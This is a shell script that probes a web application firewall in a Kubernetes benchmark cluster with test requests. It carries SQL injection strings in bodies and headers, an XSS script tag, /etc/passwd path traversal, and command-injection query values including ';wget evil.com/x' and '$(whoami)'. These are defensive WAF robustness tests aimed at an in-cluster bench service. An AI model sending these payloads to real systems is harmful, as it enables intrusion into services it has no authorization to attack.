#!/bin/sh
# Round-2 surgical robustness probes: one request at a time against
# bench-pw, recording the WAF's verdict on:
#
#   1. Body inspection cap edge cases (inconclusive in round 2 — the
#      whoami backend 502s on POST bodies it doesn't expect)
#   2. Header-borne attacks (Cookie, Referer, X-Custom, User-Agent)
#   3. Structural anomalies (TRACE / CONNECT methods, oversized hdrs)
#   4. Path traversal patterns
#   5. Shell-style RCE primitives in query strings
#
# Designed to run from outside the cluster (uses kubectl exec). The
# bench-runner Pod is the curl host so all requests land via the
# in-cluster Service IP, not via NodePort or Ingress.
#
# Usage:
#   bash benchmarks/runner/round2/robustness.sh \\
#        > benchmarks/results/round2-<ts>/robustness.txt

set -eu
NS="${NS:-waf-bench}"
TARGET_PW="${TARGET_PW:-http://bench-pw:8080}"

kx() {
  kubectl -n "$NS" exec bench-runner -- sh -c "$1"
}

echo "=== Robustness probes ==="
echo

echo "--- 1. Body inspection cap (default 1 MiB) ---"
echo "Sending a 2 MiB body (expect: passes, body not inspected past cap, default overCap=pass)"
kx "
python3 -c 'print(\"A\"*2097152)' > /tmp/big.txt
curl -s -o /dev/null -w '  body=2MiB status=%{http_code} time=%{time_total}s\n' \
  -X POST -H 'Content-Type: text/plain' --data-binary @/tmp/big.txt $TARGET_PW/post
rm -f /tmp/big.txt
"

echo "Sending an 800 KiB benign body (under cap, body inspected, expect pass)"
kx "
python3 -c 'print(\"benign-payload-\" * 50000)' > /tmp/med.txt
curl -s -o /dev/null -w '  body=~800KiB status=%{http_code} time=%{time_total}s\n' \
  -X POST -H 'Content-Type: text/plain' --data-binary @/tmp/med.txt $TARGET_PW/post
rm -f /tmp/med.txt
"

echo "Sending an 800 KiB SQLi body (under cap, inspected, expect 403)"
kx "
{ printf 'var='; python3 -c 'print(\"A\"*800000, end=\"\")'; printf ' OR 1=1 --'; } > /tmp/sqli.txt
curl -s -o /dev/null -w '  body=~800KiB+SQLi status=%{http_code} time=%{time_total}s\n' \
  -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary @/tmp/sqli.txt $TARGET_PW/post
rm -f /tmp/sqli.txt
"

echo
echo "--- 2. Header-borne attacks (Cookie/Referer/X-*) ---"
kx "
printf '  Cookie SQLi    : '; curl -s -o /dev/null -w '%{http_code}\n' -H 'Cookie: id=1 OR 1=1' $TARGET_PW/
printf '  Referer XSS    : '; curl -s -o /dev/null -w '%{http_code}\n' -H 'Referer: http://x/?q=<script>alert(1)</script>' $TARGET_PW/
printf '  X-Custom SQLi  : '; curl -s -o /dev/null -w '%{http_code}\n' -H 'X-User: 1\" OR \"1\"=\"1' $TARGET_PW/
printf '  User-Agent SQLi: '; curl -s -o /dev/null -w '%{http_code}\n' -A 'Mozilla/5.0 1 OR 1=1' $TARGET_PW/
printf '  benign Cookie  : '; curl -s -o /dev/null -w '%{http_code}\n' -H 'Cookie: sessionid=abc123; csrf=xyz789' $TARGET_PW/
"

echo
echo "--- 3. Structural anomalies (default bench config has structural group DISABLED) ---"
kx "
printf '  unusual method (TRACE)  : '; curl -s -o /dev/null -w '%{http_code}\n' -X TRACE $TARGET_PW/
printf '  unusual method (CONNECT): '; curl -s -o /dev/null -w '%{http_code}\n' -X CONNECT $TARGET_PW/
"

echo
echo "--- 4. Path traversal patterns ---"
kx "
printf '  ../etc/passwd:        '; curl -s -o /dev/null -w '%{http_code}\n' $TARGET_PW/../../etc/passwd
printf '  /etc/passwd direct:   '; curl -s -o /dev/null -w '%{http_code}\n' $TARGET_PW/etc/passwd
printf '  query ../etc/passwd:  '; curl -s -o /dev/null -w '%{http_code}\n' '$TARGET_PW/?f=../../../etc/passwd'
"

echo
echo "--- 5. Shell metacharacters in query (RCE primitives) ---"
kx "
printf '  ;wget evil.com:       '; curl -s -o /dev/null -w '%{http_code}\n' '$TARGET_PW/?cmd=;wget%20evil.com/x'
printf '  \$(whoami):           '; curl -s -o /dev/null -w '%{http_code}\n' '$TARGET_PW/?cmd=\$(whoami)'
printf '  /bin/sh:              '; curl -s -o /dev/null -w '%{http_code}\n' '$TARGET_PW/?cmd=/bin/sh'
"
